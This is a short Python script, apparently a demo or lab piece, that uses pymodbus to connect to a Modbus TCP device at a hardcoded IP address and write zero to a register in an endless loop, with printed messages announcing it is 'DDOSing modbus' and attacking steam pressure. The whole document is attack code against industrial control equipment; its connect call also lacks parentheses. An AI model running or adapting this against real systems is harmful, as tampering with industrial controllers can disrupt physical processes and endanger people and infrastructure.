from pymodbus.client.sync import ModbusTcpClient as ModbusClient
import random

def main():
    print("Connecting...")
    client = ModbusClient('111.220.27.216',5020)
    client. connect
    print("\r    Connected!")
    print("DDOSing modbus...")
    print("Attacking steam pressue...")
    try:
        while True:
            #show steam pressure dropping
            client.write_register(1,0,unit=0)
    except:
        print("Exiting")
if __name__=="__main__":
    main()
